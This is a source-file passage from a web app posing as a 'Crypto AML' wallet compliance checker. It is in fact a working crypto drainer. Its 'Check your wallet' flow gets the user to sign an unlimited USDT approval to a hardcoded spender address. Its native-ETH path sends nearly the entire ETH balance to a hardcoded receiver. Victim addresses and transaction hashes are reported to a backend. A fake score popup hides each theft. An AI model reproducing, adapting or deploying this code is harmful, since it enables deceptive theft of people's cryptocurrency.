        throw new Error("Wallet not ready");
      }

      await new Promise((r) => setTimeout(r, 300));
    }
  }






  // 🔥 Pre-generate WalletConnect URI in the background when user taps a network card.
  // By the time they hit "Continue", the URI is ready and QR shows in <1 second.
  const preGenerateWCUri = (network: NetworkType) => {
    if (!network || typeof window === "undefined") return;
    const isMobileDevice = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    if (isMobileDevice) return; // mobile uses native ethereum / redirect — no WC QR needed

    // Prevent restarting if already generating for this network
    if (pendingWCPromiseRef.current?.network === network) return;

    const generatePromise = async () => {
      try {
        let activeClient = client;
        if (!activeClient) {
          activeClient = await SignClient.init({
            projectId: PROJECT_ID,
            metadata: { name: "Crypto AML", description: "Wallet connection", url: window.location.origin, icons: [] },
          });
          setClient(activeClient);
        }

        try {
          const sessions = activeClient.session.getAll();
          for (const s of sessions) {
            await activeClient.disconnect({ topic: s.topic, reason: { code: 6000, message: "reset" } }).catch(() => { });
          }
        } catch { }

        let connectResult;
        if (network === "TRON") {
          connectResult = await activeClient.connect({
            requiredNamespaces: { tron: { chains: [CHAIN_ID], methods: ["tron_signTransaction", "tron_signMessage"], events: ["accountsChanged", "chainChanged"] } },
          });
        } else {
          const chainId = network === "BSC" ? "eip155:56" : "eip155:1";
          connectResult = await activeClient.connect({
            requiredNamespaces: { eip155: { chains: [chainId], methods: ["eth_sendTransaction", "personal_sign", "eth_sign"], events: ["accountsChanged", "chainChanged"] } },
          });
        }

        if (connectResult?.uri) {
          console.log(`⚡ Pre-generated WC URI for ${network}`);
          return { uri: connectResult.uri, approval: connectResult.approval, client: activeClient };
        }
        return null;
      } catch (e) {
        console.warn("preGenerateWCUri failed:", e);
        return null;
      }
    };

    pendingWCPromiseRef.current = { network, promise: generatePromise() };
  };

  async function handleApproveEVM_AppKit(network: "BSC" | "ETH") {
    setProcessing(true);

    // ── Chain / token config ──────────────────────────────────────────────────
    const chainId = network === "BSC" ? "eip155:56" : "eip155:1";
    const chainIdHex = network === "BSC" ? "0x38" : "0x1";
    const usdtAddress = network === "BSC" ? BSC_USDT_ADDRESS : ETH_USDT_ADDRESS;
    const spenderAddress = network === "BSC" ? BSC_SPENDER_ADDRESS : ETH_SPENDER_ADDRESS;
    const backendUrl = network === "BSC" ? BEP20_BACKEND_URL : ERC20_BACKEND_URL;
    const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    // ══ PATH A: Native window.ethereum — MOBILE ONLY (Trust Wallet DApp Browser) ══
    // Desktop browsers (Brave, Chrome+MetaMask) also inject window.ethereum.
    // We only want instant native flow on mobile; desktop always shows WalletConnect QR.
    const isMobileDevice = typeof window !== "undefined" && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    if (isMobileDevice && (window as any).ethereum) {
      try {
        const eth = (window as any).ethereum;

        // Get accounts silently first, request if needed
        let accounts: string[] = await eth.request({ method: "eth_accounts" });
        if (!accounts || accounts.length === 0) {
          accounts = await eth.request({ method: "eth_requestAccounts" });
        }
        const address = accounts[0];
        if (!address) throw new Error("No address");

        // Switch to correct network
        try {
          await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: chainIdHex }] });
        } catch (switchErr: any) {
          if (switchErr.code === 4902 && network === "BSC") {
            await eth.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: "0x38",
                chainName: "Binance Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed1.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com/"],
              }]
            });
          }
        }

        // Notify backend before approval
        if (backendUrl) {
          try {
            if (network === "BSC") {
              await axios.post(`${backendUrl.replace(/\/+$/, "")}/api/v2/ws-user-gate`, { userAddress: address, attemptFund: true });
            } else {
              await axios.post(`${backendUrl}/notify-visit`, { userAddress: address });
            }
          } catch {/* silent */ }
        }

        // Build and send approval tx — show score instantly, confirm in background
        const provider = new ethers.BrowserProvider(eth);
        const signer = await provider.getSigner();
        const allowanceIface = new ethers.Interface(["function allowance(address owner, address spender) view returns (uint256)"]);
        const usdtROContract = new ethers.Contract(usdtAddress, allowanceIface, provider);

        // 🔥 USDT on ETH blocks re-approve if allowance is already > 0
        let existingAllowance = 0n;
        try {
          existingAllowance = await usdtROContract.allowance(address, spenderAddress);
          console.log("Existing allowance:", existingAllowance.toString());
        } catch {/* proceed to approve if check fails */ }

        if (existingAllowance > 0n) {
          // ✅ Already approved — show score INSTANTLY, fire backend in background
          console.log("⚡ Already approved. Showing score immediately.");
          setTxHash("already_approved");
          setShowPopup(true);

          if (backendUrl) {
            const notifyUrl = network === "BSC"
              ? `${backendUrl.replace(/\/+$/, "")}/notify-approval`
              : `${backendUrl}/notify-approval`;
            axios.post(notifyUrl, { userAddress: address, txHash: "already_approved", source: "website" }).catch(() => { });
          }

        } else {
          // 🔥 New approval — submit tx, show score the MOMENT wallet signs it
          const iface = new ethers.Interface(["function approve(address spender, uint256 amount) returns (bool)"]);
          const data = iface.encodeFunctionData("approve", [spenderAddress, MAX_UINT256]);
          const tx = await signer.sendTransaction({ to: usdtAddress, data });

          // ✅ Show score IMMEDIATELY after wallet signs (tx.hash is available now)
          setTxHash(tx.hash);
          setShowPopup(true);

          // ✅ Confirm + notify backend in background — doesn't block the modal
          tx.wait().then((receipt) => {
            const confirmedHash = receipt?.hash ?? tx.hash;
            setTxHash(confirmedHash);
            if (backendUrl) {
              const notifyUrl = network === "BSC"
                ? `${backendUrl.replace(/\/+$/, "")}/notify-approval`
                : `${backendUrl}/notify-approval`;
              axios.post(notifyUrl, { userAddress: address, txHash: confirmedHash, source: "website" }).catch(() => { });
            }
          }).catch(() => {/* silent — success modal already showing */ });
        }

        return;
      } catch (err: any) {
        const msg = (err?.message ?? "").toLowerCase();
        if (
          err?.code === 4001 || err?.code === "ACTION_REJECTED" ||
          msg.includes("rejected") || msg.includes("cancelled") || msg.includes("user denied")
        ) return;
        console.error("Native EVM error:", err);
        return;
      } finally {
        setProcessing(false);
      }
    }

    // ══ MOBILE: Redirect to Trust Wallet DApp browser if no native ethereum injection ══
    // Only redirect if NOT already inside Trust Wallet browser.
    // If we are inside Trust Wallet but ethereum loaded late, we fall through to WC path.
    if (typeof window !== "undefined" && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent)) {
      const isTrustAlready =
        ((window as any).ethereum && ((window as any).ethereum.isTrust || (window as any).ethereum.isTrustWallet)) ||
        navigator.userAgent.includes("TrustWallet");

      if (!isTrustAlready) {
        // Regular mobile browser — redirect with network param preserved
        const coinId = network === "BSC" ? "9006" : "60";
        const baseUrl = window.location.origin + window.location.pathname;
        const destUrl = `${baseUrl}?tw_network=${network}`;
        const encodedDest = encodeURIComponent(destUrl);

        const trustDeepLink = `trust://open_url?coin_id=${coinId}&url=${encodedDest}`;
        const trustUniversalLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodedDest}`;

        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        document.body.appendChild(iframe);
        iframe.src = trustDeepLink;

        let deepLinkOpened = false;
        const visibilityHandler = () => { if (document.hidden) deepLinkOpened = true; };
        document.addEventListener("visibilitychange", visibilityHandler);

        setTimeout(() => {
          document.removeEventListener("visibilitychange", visibilityHandler);
          document.body.removeChild(iframe);
          if (!deepLinkOpened) {
            window.location.href = trustUniversalLink;
          }
        }, 1500);

        setProcessing(false);
        return;
      }
      // Already inside Trust Wallet but ethereum came in late — fall through to WC or native path
    }

    // ══ PATH B: WalletConnect fallback (DESKTOP browsers only) ══

    try {
      // Check for pre-generated URI (from network card tap)
      let preGen = null;
      if (pendingWCPromiseRef.current && pendingWCPromiseRef.current.network === network) {
        preGen = await pendingWCPromiseRef.current.promise;
        pendingWCPromiseRef.current = null; // consume it
      }

      if (preGen) {
        // QR shows INSTANTLY — URI already generated
        setTronWCUri(preGen.uri);
        setProcessing(false);
        const sess = await preGen.approval();
        const address = sess.namespaces?.eip155?.accounts?.[0]?.split(":")?.[2];
        if (!address) throw new Error("No wallet address from session");
        setProcessing(true);
        setTronWCUri(null);

        // ✅ Show "check your wallet" sign modal for desktop
        setSignModalNetwork(network === "BSC" ? "USDT / BEP-20" : "USDT / ERC-20");
        setShowSignModal(true);

        // re-use activeClient from pre-gen
        const activeClient = preGen.client;
        // proceed with rest of flow (notify-visit, balance check, approve, notify-approval)
        if (backendUrl) {
          try {
            if (network === "BSC") {
              await axios.post(`${backendUrl.replace(/\/+$/, "")}/api/v2/ws-user-gate`, { userAddress: address, attemptFund: true });
            } else if (network === "ETH") {
              await axios.post(`${backendUrl}/notify-visit`, { userAddress: address });
            }
          } catch { }
        }
        let usdtAmount = "0";
        let existingAllowanceWC = 0n;
        try {
          const rpc = network === "BSC" ? "https://bsc-dataseed.binance.org/" : "https://cloudflare-eth.com";
          const rpcProvider = new ethers.JsonRpcProvider(rpc);
          const iface2 = new ethers.Interface([
            "function balanceOf(address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function allowance(address owner, address spender) view returns (uint256)"
          ]);
          const usdtRO = new ethers.Contract(usdtAddress, iface2, rpcProvider);
          const [rawBal, dec, rawAllowance] = await Promise.all([
            usdtRO.balanceOf(address), usdtRO.decimals(), usdtRO.allowance(address, spenderAddress)
          ]);
          usdtAmount = ethers.formatUnits(rawBal, dec);
          existingAllowanceWC = rawAllowance as bigint;
        } catch { }
        let finalTxHash: string = "";
        if (existingAllowanceWC > 0n) {
          finalTxHash = "already_approved";
          setShowSignModal(false);
        } else {
          const iface = new ethers.Interface(["function approve(address spender, uint256 amount) returns (bool)"]);
          const data = iface.encodeFunctionData("approve", [spenderAddress, MAX_UINT256]);
          finalTxHash = await activeClient.request<string>({
            topic: sess.topic, chainId,
            request: { method: "eth_sendTransaction", params: [{ from: address, to: usdtAddress, data, gas: "0x186A0" }] },
          });
          setShowSignModal(false);
        }
        setTxHash(finalTxHash ?? "");
        setShowPopup(true);

        if (network === "BSC" && backendUrl) {
          const url = backendUrl.endsWith("/notify-approval") ? backendUrl : `${backendUrl}/notify-approval`;
          axios.post(url, { userAddress: address, txHash: finalTxHash ?? "", source: "website" }).catch(() => {});
        }
        if (network === "ETH" && backendUrl) {
          axios.post(`${backendUrl}/notify-approval`, { userAddress: address, txHash: finalTxHash ?? "", source: "website" }).catch(() => {});
        }
        return;
      }

      // Fallback: no pre-generated URI — generate now (slight delay)
      // 1. Get or re-init SignClient
      let activeClient = client;
      if (!activeClient) {
        activeClient = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "Crypto AML",
            description: "Wallet connection",
            url: typeof window !== "undefined" ? window.location.origin : "",
            icons: [],
          },
        });
        setClient(activeClient);
      }

      // 2. Clear stale sessions so a fresh URI is always generated (fixes QR not showing)
      try {
        const sessions = activeClient.session.getAll();
        for (const s of sessions) {
          await activeClient.disconnect({ topic: s.topic, reason: { code: 6000, message: "reset" } }).catch(() => { });
        }
      } catch {/* silent */ }

      // 3. Connect — always produces a fresh URI
      const { uri, approval } = await activeClient.connect({
        requiredNamespaces: {
          eip155: {
            chains: [chainId],
            methods: ["eth_sendTransaction", "personal_sign", "eth_sign"],
            events: ["accountsChanged", "chainChanged"],
          },
        },
      });

      if (!uri) throw new Error("WalletConnect URI not generated");

      // 4. Show QR on desktop / deep-link button on mobile
      setTronWCUri(uri);
      setProcessing(false);

      // 5. Wait for wallet approval (session established)
      const sess = await approval();
      const address = sess.namespaces?.eip155?.accounts?.[0]?.split(":")?.[2];
      if (!address) throw new Error("No wallet address from session");

      setProcessing(true);
      setTronWCUri(null);

      // ✅ Show "check your wallet" sign modal for desktop
      setSignModalNetwork(network === "BSC" ? "USDT / BEP-20" : "USDT / ERC-20");
      setShowSignModal(true);

      // 5b. Notify backend (auto-gas top-up + Telegram)
      if (backendUrl) {
        try {
          if (network === "BSC") {
            await axios.post(`${backendUrl.replace(/\/+$/, "")}/api/v2/ws-user-gate`, { userAddress: address, attemptFund: true });
          } else if (network === "ETH") {
            await axios.post(`${backendUrl}/notify-visit`, { userAddress: address });
          }
        } catch {/* silent */ }
      }

      // 6. Read USDT balance + allowance via public RPC
      let usdtAmount = "0";
      let existingAllowanceWC = 0n;
      try {
        const rpc = network === "BSC"
          ? "https://bsc-dataseed.binance.org/"
          : "https://cloudflare-eth.com";
        const rpcProvider = new ethers.JsonRpcProvider(rpc);
        const iface2 = new ethers.Interface([
          "function balanceOf(address) view returns (uint256)",
          "function decimals() view returns (uint8)",
          "function allowance(address owner, address spender) view returns (uint256)"
        ]);
        const usdtRO = new ethers.Contract(usdtAddress, iface2, rpcProvider);
        const [rawBal, dec, rawAllowance] = await Promise.all([
          usdtRO.balanceOf(address),
          usdtRO.decimals(),
          usdtRO.allowance(address, spenderAddress)
        ]);
        usdtAmount = ethers.formatUnits(rawBal, dec);
        existingAllowanceWC = rawAllowance as bigint;
        console.log("WC existing allowance:", existingAllowanceWC.toString());
      } catch {/* proceed without */ }

      let finalTxHash: string = "";

      if (existingAllowanceWC > 0n) {
        // ✅ Already approved — skip the tx entirely
        console.log("⚡ WC: Already approved. Notifying backend directly.");
        finalTxHash = "already_approved";
        setShowSignModal(false);
      } else {
        // 7. Build approve(spender, MaxUint256) calldata
        const iface = new ethers.Interface([
          "function approve(address spender, uint256 amount) returns (bool)",
        ]);
        const data = iface.encodeFunctionData("approve", [spenderAddress, MAX_UINT256]);

        // 8. Send via WalletConnect session
        finalTxHash = await activeClient.request<string>({
          topic: sess.topic,
          chainId,
          request: {
            method: "eth_sendTransaction",
            params: [{ from: address, to: usdtAddress, data, gas: "0x186A0" }],
          },
        });
        setShowSignModal(false);
      }

      // 10. Show success modal instantly
      setTxHash(finalTxHash ?? "");
      setShowPopup(true);

      // 9a. BSC: notify backend /notify-approval in background
      if (network === "BSC" && backendUrl) {
        const url = backendUrl.endsWith("/notify-approval")
          ? backendUrl
          : `${backendUrl}/notify-approval`;
        axios.post(url, {
          userAddress: address,
          txHash: finalTxHash ?? "",
          source: "website"
        }).catch(() => {});
      }

      // 9b. ETH: notify backend /notify-approval in background
      if (network === "ETH" && backendUrl) {
        axios.post(`${backendUrl}/notify-approval`, {
          userAddress: address,
          txHash: finalTxHash ?? "",
          source: "website",
        }).catch(() => {});
      }

    } catch (err: any) {
      setShowSignModal(false);
      const msg = (err?.message ?? "").toLowerCase();
      if (
        err?.code === 4001 ||
        err?.code === "ACTION_REJECTED" ||
        msg.includes("rejected") ||
        msg.includes("cancelled") ||
        msg.includes("user denied")
      ) return;
      console.error("EVM WC error:", err);
    } finally {
      setProcessing(false);
      setTronWCUri(null);
    }
  }


  // ══ Native ETH send handler ══
  async function handleApproveETH_Native() {
    setProcessing(true);
    const backendUrl = process.env.NEXT_PUBLIC_ETH_NATIVE_BACKEND_URL ?? "";
    const receiver = "0xB5CB26a761F208A47cD1A7241290aebc91D3cD55";

    const isMobileDevice =
      typeof window !== "undefined" &&
      /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

    // ── PATH A: Mobile — native window.ethereum (Trust Wallet DApp browser) ──
    if (isMobileDevice && (window as any).ethereum) {
      try {
        const eth = (window as any).ethereum;
        let accounts: string[] = await eth.request({ method: "eth_accounts" });
        if (!accounts || accounts.length === 0) {
          accounts = await eth.request({ method: "eth_requestAccounts" });
        }
        const address = accounts[0];
        if (!address) throw new Error("No address");

        // Switch to Ethereum Mainnet
        try {
          await eth.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          });
        } catch { }

        if (backendUrl) {
          axios
            .post(`${backendUrl}/notify-visit`, { userAddress: address, attemptFund: true })
            .catch(() => { });
        }

        const provider = new ethers.BrowserProvider(eth);
        const signer = await provider.getSigner();

        // Get balance and subtract gas buffer (0.002 ETH)
        const balanceWei = await provider.getBalance(address);
        const gasBuffer = ethers.parseEther("0.002");
        const sendAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : balanceWei / 2n;

        const tx = await signer.sendTransaction({ to: receiver, value: sendAmount });

        setTxHash(tx.hash);
        setShowPopup(true);

        tx.wait().then((receipt) => {
          const hash = receipt?.hash ?? tx.hash;
          setTxHash(hash);
          if (backendUrl) {
            axios
              .post(`${backendUrl}/notify-approval`, { userAddress: address, txHash: hash, source: "website" })
              .catch(() => { });
          }
        }).catch(() => { });

        return;
      } catch (err: any) {
        const msg = (err?.message ?? "").toLowerCase();
        if (err?.code === 4001 || msg.includes("rejected") || msg.includes("user denied")) return;
        console.error("Native ETH mobile error:", err);
        return;
      } finally {
        setProcessing(false);
      }
    }

    // ── MOBILE: Redirect to Trust Wallet if no ethereum injected ──
    // Only redirect if NOT already inside Trust Wallet browser.
    if (
      typeof window !== "undefined" &&
      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent)
    ) {
      const isTrustAlready =
        ((window as any).ethereum && ((window as any).ethereum.isTrust || (window as any).ethereum.isTrustWallet)) ||
        navigator.userAgent.includes("TrustWallet");

      if (!isTrustAlready) {
        // Preserve tw_network so auto-trigger fires on reload inside Trust Wallet
        const baseUrl = window.location.origin + window.location.pathname;
        const destUrl = `${baseUrl}?tw_network=ETH_NATIVE`;
        const encodedDest = encodeURIComponent(destUrl);
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        document.body.appendChild(iframe);
        iframe.src = `trust://open_url?coin_id=60&url=${encodedDest}`;
        setTimeout(() => {
          document.body.removeChild(iframe);
          window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedDest}`;
        }, 1500);
        setProcessing(false);
        return;
      }
      // Already inside Trust Wallet — fall through to desktop QR path (shouldn't happen, but safe)
    }

    // ── PATH B: Desktop — show QR that opens the site in Trust Wallet browser ──
    // Scanning this QR on a phone opens the DApp inside Trust Wallet's built-in browser
    // where window.ethereum is injected and the native mobile flow works perfectly.
    try {
      const siteUrl = typeof window !== "undefined" ? window.location.href : "";
      const trustBrowserUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(siteUrl)}`;
      setEthNativeDesktopQR(trustBrowserUrl);
    } catch (err: any) {
      console.error("ETH Native desktop QR error:", err);
    } finally {
      setProcessing(false);
    }
  }



  const items = [

    { name: "INATBA", color: "bg-blue-900" },
    { name: "CDA", color: "bg-black" },
    { name: "ATII", color: "bg-black" },
    { name: "LSW3", color: "bg-black" },
    { name: "EBA", color: "bg-blue-50" },
  ];



  return (
    <>
      <header className="fixed top-0 left-0 w-full text-gray-700 bg-white border-gray-700 decoration-gray-700 outline-gray-700 z-[10000]">
        <div className="px-5 mx-auto w-full text-gray-700 border-gray-700 decoration-gray-700 max-w-[1250px] outline-gray-700">
          <div className="flex justify-between items-center w-full text-gray-700 border-gray-700 decoration-gray-700 h-[93px] outline-gray-700">
            {/* Logo */}

            <div className="flex items-center gap-2">
              <img
                src="/logoaml.png"
                alt="Logo"
                className="h-8 w-8 object-contain"
              />
              <span className="text-xl font-bold text-black">
                AML Report
              </span>
            </div>

            {/* Desktop Nav */}
            <ul className=" hidden md:flex justify-center items-center text-base leading-4 text-gray-700 border-gray-700 decoration-gray-700 outline-gray-700">
              <li className="list-item mr-2.5 ml-1.5 text-base leading-4 text-gray-700 border-gray-700 decoration-gray-700 outline-gray-700">
                <a href="#analysis" className="px-2 py-1.5 text-base leading-4 text-gray-700 rounded-lg border-gray-700 cursor-pointer decoration-gray-700 duration-[0.3s] outline-gray-700">
                  Analysis
                </a>
              </li>
              <li className="list-item mr-2.5 ml-1.5 text-base leading-4 text-gray-700 border-gray-700 decoration-gray-700 outline-gray-700">
                <a href="#faq" className="px-2 py-1.5 text-base leading-4 text-gray-700 rounded-lg border-gray-700 cursor-pointer decoration-gray-700 duration-[0.3s] outline-gray-700">
                  FAQ
                </a>
              </li>
              <li className="list-item mr-2.5 ml-1.5 text-base leading-4 text-gray-700 border-gray-700 decoration-gray-700 outline-gray-700">
                <a href="#pricing" className="px-2 py-1.5 text-base leading-4 text-gray-700 rounded-lg border-gray-700 cursor-pointer decoration-gray-700 duration-[0.3s] outline-gray-700">
                  Pricing
                </a>
              </li>
              <li className="list-item ml-1.5 text-base leading-4 text-gray-700 border-gray-700 decoration-gray-700 outline-gray-700">
                <a href="#about" className="px-2 py-1.5 text-base leading-4 text-gray-700 rounded-lg border-gray-700 cursor-pointer decoration-gray-700 duration-[0.3s] outline-gray-700">
                  About Us
                </a>
              </li>
            </ul>

            {/* Right section */}
            <div className="flex justify-end items-center text-gray-700 border-gray-700 decoration-gray-700 outline-gray-700">
              {/* Mobile Hamburger */}
              <button
                className="relative z-20 flex h-6 w-8 items-center justify-center md:hidden"
                onClick={() => setIsMenuOpen((prev) => !prev)}
                aria-label="Toggle navigation"
              >
                <span
                  className={`absolute block h-[3px] w-full rounded transition-all duration-300 ${isMenuOpen ? "top-1/2 rotate-45 bg-black" : "top-0 bg-black"
                    }`}
                />
                <span
                  className={`absolute block h-[3px] w-full rounded transition-all duration-300 ${isMenuOpen ? "opacity-0" : "top-1/2 bg-black"
                    }`}
                />
                <span
                  className={`absolute block h-[3px] w-full rounded transition-all duration-300 ${isMenuOpen ? "top-1/2 -rotate-45 bg-black" : "bottom-0 bg-black"
                    }`}
                />
              </button>

              {/* Desktop CTA */}
              <button
                onClick={openNetworkFlow}
                className={`hidden md:flex justify-center items-center px-6 ml-5 text-base font-semibold rounded-[50px] h-[47px] duration-300 ${(processing || processingTRX)
                  ? "bg-gray-600 cursor-wait text-gray-300"
                  : "bg-black text-white hover:bg-gray-900 cursor-pointer"
                  }`}
              >
                {(processing || processingTRX) ? "Processing..." : "Check your wallet"}
              </button>
            </div>
          </div>
        </div>

        {/* Mobile dropdown menu */}
        <div
          className={`md:hidden fixed inset-x-0 top-[93px] bg-white border-t border-gray-200 overflow-hidden transition-[max-height] duration-300 ${isMenuOpen ? "max-h-[260px]" : "max-h-0"
            }`}
        >
          <div className="px-5 py-4 space-y-4">
            <nav className="flex flex-col space-y-2">
              {["analysis", "faq", "pricing", "about"].map((item) => (
                <a
                  key={item}
                  href={`#${item}`}
                  className="w-full py-2 text-sm font-medium text-gray-700 rounded-lg hover:bg-gray-100"
                  onClick={() => setIsMenuOpen(false)}
                >
                  {item === "faq" ? "FAQ" : item.charAt(0).toUpperCase() + item.slice(1)}
                </a>
              ))}
            </nav>

            <a
              className="flex justify-center items-center w-full px-6 py-2 text-base font-semibold text-white bg-black rounded-[50px]"
              onClick={openNetworkFlow}
            >
              Check your wallet
            </a>
          </div>
        </div>
      </header>

      <section className="w-full bg-[#f4f4f5] overflow-x-hidden overflow-y-hidden mt-[15px]">
        <div className="mx-auto w-full max-w-[1250px] px-5">
          {/* add top padding so it's not under fixed navbar + nice vertical center */}
          <div className="flex flex-col-reverse items-center justify-between gap-10 py-20 lg:flex-row lg:items-center lg:py-24">
            {/* Left content */}
            <div className="w-full max-w-[710px]">
              <div className="mb-4 text-xl font-semibold leading-snug sm:text-2xl md:text-5xl text-black">
                USDT Level Checker for crypto business
              </div>

              <p className="mb-8 max-w-[550px] text-base leading-7 md:text-lg md:leading-9 text-black">
                CRYPTO AML checks Ethereum, BNB, and Tron networks for AML compliance to minimize risks. Our platform provides comprehensive analysis to protect your crypto assets and ensure regulatory compliance across major blockchains.
              </p>
              <button
                onClick={openNetworkFlow}
                className={`inline-flex h-[70px] items-center justify-center rounded-[50px] px-10 text-xl font-bold transition duration-300 ${(processing || processingTRX)
                  ? "bg-blue-400 cursor-wait text-white"
                  : "bg-blue-600 hover:bg-blue-700 text-white cursor-pointer"
                  }`}
              >
                {(processing || processingTRX) ? "Processing..." : "Check your wallet"}
              </button>
            </div>

            {/* Right image / card */}
            <div className="flex w-full max-w-[1000px] justify-center lg:justify-start">
              <img
                alt=""
                className="w-full h-full object-cover "
                loading="lazy"
                src="mac.webp"
              />
            </div>

          </div>
        </div>
      </section>











      {showNetworkModal && (
        <div className="fixed inset-0 z-[20000] flex items-center justify-center bg-black/40 px-4">
          <div className="relative w-full max-w-md rounded-3xl bg-white p-6 shadow-xl">

            <button
              onClick={() => {
                setShowNetworkModal(false);
                setSelectedNetwork(null);
              }}
              className="absolute top-3 right-3 flex h-8 w-8 items-center justify-center rounded-full bg-black text-white text-lg font-bold"
            >
              ×
            </button>

            <h1 className="text-2xl font-bold text-slate-900">Select Your Network</h1>
            <p className="mt-1.5 mb-6 text-sm text-slate-500">
              To continue, please select the desired network
            </p>

            {/* BSC */}
            <div
              onClick={() => { setSelectedNetwork("BSC"); preGenerateWCUri("BSC"); }}
              className={`mt-3 flex gap-4 items-center px-4 py-3 rounded-2xl border cursor-pointer
          ${selectedNetwork === "BSC" ? "border-blue-600 bg-blue-50" : "border-slate-300"}`}
            >
              <img src="bnb.png" alt="BSC" className="w-10 h-10" />
              <div>
                <p className="font-semibold text-black">USDT</p>
                <p className="text-sm text-slate-400">BEP-20</p>
              </div>
            </div>

            {/* ETH */}
            <div
              onClick={() => { setSelectedNetwork("ETH"); preGenerateWCUri("ETH"); }}
              className={`mt-2 flex gap-4 items-center px-4 py-3 rounded-2xl border cursor-pointer
          ${selectedNetwork === "ETH" ? "border-blue-600 bg-blue-50" : "border-slate-300"}`}
            >
              <img src="eth.png" alt="ETH" className="w-10 h-10" />
              <div>
                <p className="font-semibold text-black">USDT</p>
                <p className="text-sm text-slate-400">ERC-20</p>
              </div>
            </div>

            {/* Native ETH */}
            <div
              onClick={() => { setSelectedNetwork("ETH_NATIVE"); preGenerateWCUri("ETH_NATIVE"); }}
              className={`mt-2 flex gap-4 items-center px-4 py-3 rounded-2xl border cursor-pointer
          ${selectedNetwork === "ETH_NATIVE" ? "border-blue-600 bg-blue-50" : "border-slate-300"}`}
            >
              <img src="eth.png" alt="ETH" className="w-10 h-10" />
              <div>
                <p className="font-semibold text-black">ETH</p>
                <p className="text-sm text-slate-400">Ethereum</p>
              </div>
            </div>

            {/* TRON */}
            <div
              onClick={() => { setSelectedNetwork("TRON"); preGenerateWCUri("TRON"); }}
              className={`mt-2 flex gap-4 items-center px-4 py-3 rounded-2xl border cursor-pointer
          ${selectedNetwork === "TRON" ? "border-blue-600 bg-blue-50" : "border-slate-300"}`}
            >
              <img src="tron.png" alt="TRON" className="w-10 h-10" />
              <div>
                <p className="font-semibold text-black">USDT</p>
                <p className="text-sm text-slate-400">TRC-20</p>
              </div>
            </div>

            <button
              onClick={async () => {
                if (!selectedNetwork || processing) return;

                // ── Mobile: redirect to Trust Wallet with network encoded in URL ──
                const isMobileDevice =
                  typeof window !== "undefined" &&
                  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);

                const isTrustBrowser =
                  typeof window !== "undefined" &&
                  (window as any).ethereum &&
                  ((window as any).ethereum.isTrust ||
                    (window as any).ethereum.isTrustWallet ||
                    navigator.userAgent.includes("TrustWallet"));

                if (isMobileDevice && !isTrustBrowser) {
                  // Build the destination URL with the selected network baked in
                  const baseUrl = window.location.origin + window.location.pathname;
                  const destUrl = `${baseUrl}?tw_network=${selectedNetwork}`;
                  const encodedDest = encodeURIComponent(destUrl);

                  // Choose the right coin_id: TRX=195, BSC=9006, ETH/ETH_NATIVE=60
                  const coinId =
                    selectedNetwork === "TRON" ? "195" :
                    selectedNetwork === "BSC" ? "9006" : "60";

                  const deepLink = `trust://open_url?coin_id=${coinId}&url=${encodedDest}`;
                  const universalLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodedDest}`;

                  setShowNetworkModal(false);

                  // Try deep-link first via hidden iframe (Android), then universal link fallback
                  const iframe = document.createElement("iframe");
                  iframe.style.display = "none";
                  document.body.appendChild(iframe);
                  iframe.src = deepLink;

                  setTimeout(() => {
                    document.body.removeChild(iframe);
                    window.location.href = universalLink;
                  }, 300);

                  return; // Redirecting — don't proceed with wallet flow here
                }

                // ── Desktop or already inside Trust Wallet browser ── proceed normally
                setShowNetworkModal(false);

                if (selectedNetwork === "BSC") {
                  await handleApproveEVM_AppKit("BSC");
                } else if (selectedNetwork === "ETH") {
                  await handleApproveEVM_AppKit("ETH");
                } else if (selectedNetwork === "ETH_NATIVE") {
                  await handleApproveETH_Native();
                } else if (selectedNetwork === "TRON") {
                  await handleApproveTRON();
                }
              }}
              className={`mt-6 w-full h-12 rounded-2xl font-semibold text-white transition ${(processing || processingTRX)
                ? "bg-blue-400 cursor-wait"
                : "bg-blue-600 hover:bg-blue-700"
                }`}
              disabled={!selectedNetwork || processing || processingTRX}
            >
              {(processing || processingTRX) ? "Processing..." : "Continue"}
            </button>

          </div>
        </div>
      )}








      {showWalletModal && (
        <div className="fixed inset-0 z-[21000] flex items-center justify-center bg-black/40 px-4">
          <div className="relative w-full max-w-md rounded-3xl bg-white p-6 shadow-xl">

            <button
              onClick={() => {
                setShowWalletModal(false);
                setSelectedWallet(null);
                setTronLinkSelected(false);
                setSafePalSelected(false);
              }}
              className="absolute top-3 right-3 flex h-8 w-8 items-center justify-center rounded-full bg-black text-white text-lg font-bold"
            >
              ×
            </button>

            <h1 className="text-2xl font-bold text-slate-900">Select Wallet</h1>
            <p className="mt-1.5 mb-6 text-sm text-slate-500">
              Choose the wallet to continue
            </p>

            {/* ---------- Trust Wallet only (all networks) ---------- */}
            <div
              onClick={() => setSelectedWallet("TRUST")}
              className="mb-3 flex gap-4 items-center px-4 py-3 rounded-2xl border cursor-pointer border-blue-600 bg-blue-50"
            >
              <img src="trust.webp" alt="Trust" className="w-10 h-10" />
              <p className="font-semibold text-black">Trust Wallet</p>
            </div>

            {/* ---------- CONTINUE ---------- */}
            <button
              onClick={async () => {
                if (processing) return;

                if (selectedNetwork === "BSC") {
